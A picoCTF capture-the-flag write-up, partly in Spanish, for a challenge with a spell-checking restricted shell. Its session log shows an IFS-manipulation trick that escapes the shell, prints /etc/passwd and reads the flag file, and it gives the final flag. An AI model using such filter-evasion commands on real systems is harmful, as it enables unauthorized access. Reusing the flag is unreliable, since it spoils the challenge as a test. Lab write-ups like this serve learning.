# special

### Description

Don't power users get tired of making spelling mistakes in the shell? Not anymore! Enter Special, the Spell Checked Interface for Affecting Linux. Now, every word is properly spelled and capitalized... automatically and behind-the-scenes! Be the first to test Special in beta, and feel free to tell us all about how Special streamlines every development process that you face. When your co-workers see your amazing shell interface, just tell them: That's Special (TM)Start your instance to see connection details.

Additional details will be available after launching your challenge instance.

Start your instance to see connection details.
`ssh -p 54627 ctf-player@saturn.picoctf.net`
`The password is d137d16e

### 1 Hints 

* Experiment with different shell syntax.


## Solución

Ingresamos nuestra dirección ssh proporcionada, ponemos la contraseña y una vez dado los permisos, se ejecutó un comando que manipulaba la variable `IFS` para ver el contenido del archivo `/etc/passwd`, lo que le permitió observar los usuarios del sistema. 
Luego, se intentó leer el archivo `blargh/flag.txt` mediante un comando que no se ejecutó correctamente, pero de igual manera nos mostro nuestra respectiva flag:

```
jazmin@DESKTOP-1CBQJ6D:~$ ssh -p 54627 ctf-player@saturn.picoctf.net
The authenticity of host '[saturn.picoctf.net]:54627 ([13.59.203.175]:54627)' can't be established.
ECDSA key fingerprint is SHA256:QnAZA/SzXGs8PlYucCvZX2veeskyyebWFDKU84sYgME.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[saturn.picoctf.net]:54627,[13.59.203.175]:54627' (ECDSA) to the list of known hosts.
ctf-player@saturn.picoctf.net's password:
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 6.5.0-1023-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Special$ IFS=];b=cat]/etc/passwd;$b
IFS=];b=cat]/etc/passwd;$b
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:105::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
ctf-player:x:1000:1000::/home/ctf-player:/usr/local/Special.py

Special$ $(IFS=];b=cat]blargh/flag.txt;$b)
$(IFS=];b=cat]blargh/flag.txt;$b)
sh: 1: picoCTF{5p311ch3ck_15_7h3_w0r57_3befb794}: not found
Special$ Connection to saturn.picoctf.net closed by remote host.
Connection to saturn.picoctf.net closed.
jazmin@DESKTOP-1CBQJ6D:~$
```

### Resultado: picoCTF{5p311ch3ck_15_7h3_w0r57_3befb794}